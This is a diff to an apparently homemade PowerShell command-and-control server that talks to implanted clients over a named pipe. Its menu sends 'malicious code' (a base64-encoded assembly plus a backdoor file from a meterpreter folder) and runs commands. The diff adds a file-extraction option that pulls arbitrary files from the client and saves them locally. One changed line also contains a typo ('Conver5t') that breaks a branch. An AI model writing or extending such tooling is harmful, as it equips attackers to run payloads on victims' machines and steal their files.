@@ -19,12 +19,14 @@ try{
         # Reset the variables command and messages after each task
         $msg = ""
         $command = ""
+        $path = ""
 
         $action = Read-Host "
         1. Send message to client
         2. Run Malicious code
         3. Run Command
-        4. Quit
+        4. Extract file
+        5. Quit
 "
         
         if ($action -eq 1){
@@ -51,8 +53,6 @@ try{
                 $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
                 $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
                 $sw.WriteLine($assemblyB64) # Server sending to the client
-                [String]$parameter = Read-Host "Enter Parameter"
-                $sw.WriteLine($parameter) # Sending parameter to the client
                 $sw.Dispose()
                 $pipeServer.Dispose()
             }
@@ -63,7 +63,7 @@ try{
                 # $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\meterpreter\Yahudmeter\sharpmeter.exe'
                 $backdoor = "C:\Users\HakkYahud\Documents\Symantec\meterpreter\Yahudmeter\exploit.txt"
                 $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
-                $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
+                $assemblyB64 = [System.Conver5t]::ToBase64String($assemblyByte)
                 $sw.WriteLine($assemblyB64)
                 [String]$parameter = [System.IO.File]::ReadAllText($backdoor)
                 $sw.WriteLine($parameter)
@@ -105,7 +105,44 @@ try{
         }
 
         elseif ($action -eq 4){
+            Write-Host "Extracting file"
             $sw.WriteLine("action=4")
+            while($path -ne "stop"){
+                $path = Read-Host "Path of the file to extract"
+                $sw.WriteLine($path)
+
+                if($path -eq "stop"){
+                    # do nothing
+                }
+
+                else{
+                    $response = $sr.ReadLine()
+                    if($response -eq "File Not Found..."){
+                        Write-Host $response
+                    }
+                    else {
+                        Write-Host "Copying file"       
+                        $bytefileb64 = $response
+                        $bytefile = [System.Convert]::FromBase64String($bytefileb64)
+                        $filename = Split-Path $path -Leaf
+                        Write-Host $filename
+                        Write-Host $bytefile
+
+                        $path_to_copy = "C:\Users\HakkYahud\Documents\FileFromPipe"
+                        try{
+                            [System.IO.File]::WriteAllBytes($path_to_copy+"\"+$filename, $bytefile)
+                            Write-Host "File extracted"
+                        }
+                        catch [System.IO.DirectoryNotFoundException]{
+                            Write-Host "Target directory not found"
+                        }
+                    }
+                }             
+            }
+        }
+
+        elseif ($action -eq 5){
+            $sw.WriteLine("action=5")
             $sw.Dispose()
             $pipeServer.Dispose()
         }
